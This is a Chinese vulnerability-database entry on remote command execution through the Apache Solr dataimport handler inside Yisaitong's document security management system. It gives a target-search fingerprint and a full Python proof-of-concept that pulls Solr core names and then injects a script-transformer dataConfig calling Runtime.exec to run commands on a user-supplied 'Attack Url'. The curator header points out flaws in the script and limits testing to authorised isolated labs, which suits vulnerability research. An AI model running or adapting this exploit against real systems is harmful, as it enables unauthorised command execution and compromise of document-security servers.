---
source: "Threekiii/Vulnerability-Wiki"
title: "亿赛通电子文档安全管理系统内置Apache Solr dataimport脚本执行"
product: "亿赛通电子文档安全管理系统内置Apache Solr"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "DIH/脚本可用及dataConfig许可；版本未知"
prerequisites: "Solr管理接口暴露条件未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A-%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-dataimport-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-a9945bd672521e5fcc38f8ad"
entity_id: "ve-a9945bd672521e5fcc38f8ad"
schema_version: "1"
---

# 亿赛通电子文档安全管理系统内置Apache Solr dataimport脚本执行

## 条目说明

- 对象与具体问题：亿赛通电子文档安全管理系统内置Apache Solr；dataimport脚本执行
- 版本、配置及部署条件：DIH/脚本可用及dataConfig许可；版本未知
- 认证与权限前提：Solr管理接口暴露条件未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- streamsrc与streamsrc1引用不一致；XML响应正则脆弱且缺wt/格式指定，异常隐藏成请求失败
- core_name获取后URL仍写core=tika，需明确是否必要与环境关联
- 缺亿赛通发行版本到Solr版本映射/厂商补丁，不能仅按title指纹确定受影响

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

亿赛通 电子文档安全管理系统 dataimport 存在远程命令执行漏洞，攻击者通过构造特定的请求可执行任意命令

### 漏洞影响

```
亿赛通 电子文档安全管理系统
```

### 网络测绘

```
title="电子文档安全管理系统"
```

### 漏洞复现

登录页面如下


![](./.resource/亿赛通-电子文档安全管理系统-dataimport-远程命令执行漏洞/media/202202091906952.png)


先获取 core name


访问路径


```plain
/solr/admin/cores
```


![](./.resource/亿赛通-电子文档安全管理系统-dataimport-远程命令执行漏洞/media/202202091906483.png)


使用POC执行whoami

![](./.resource/亿赛通-电子文档安全管理系统-dataimport-远程命令执行漏洞/media/202202091906902.png)


### 漏洞POC


```python
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : 亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/solr/admin/cores"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/solr/admin/cores.... \033[0m".format(target_url))
        if 'responseHeader' in response.text and response.status_code == 200:
            result = re.search(
                r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', response.text, re.I)
            core_name = result.group(1)
            print("\033[36m[o] 获取core_name : {} \033[0m".format(core_name))
            POC_2(target_url, core_name)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, core_name):
    cmd = "whoami"
    vuln_url = target_url + "/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20".format(core_name, cmd)
    files = {
        'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
        <item/>
        </RDF>'''
    }
    try:
        print("\033[36m[o] 正在执行 whoami ... \033[0m".format(target_url))
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, files=files, verify=False, timeout=5)
        cmd_response = re.search(
                r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', response.text, re.I)
        cmd_response = cmd_response.group(1)
        if response.status_code == 200 and cmd_response:
            print("\033[36m[o] 命令响应为:\n{} \033[0m".format(cmd_response))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
